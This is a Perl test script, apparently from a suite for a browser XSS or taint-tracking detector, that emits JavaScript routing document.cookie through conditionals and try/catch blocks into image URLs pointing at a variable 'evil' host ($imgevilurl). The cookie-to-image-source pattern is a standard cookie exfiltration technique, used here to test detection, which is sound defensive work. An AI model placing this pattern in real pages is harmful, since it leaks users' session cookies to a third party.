#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_SETRVAL";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 1;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;

		// shouldn't be evil 

		function a() {
			try {throw("1");} catch (e) { return "1";} finally {};
		}
		var dut = a();
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		function b() {
		  if ($evil) { 
			try {throw("1");} catch (e) { 
			  return "1"; 
			} finally {};
		  }
		}
		var dut2 = b();
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		function c() {
			try {throw("1");} catch (e) { return evil;} finally {};
		}
		var dut3 = c();
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
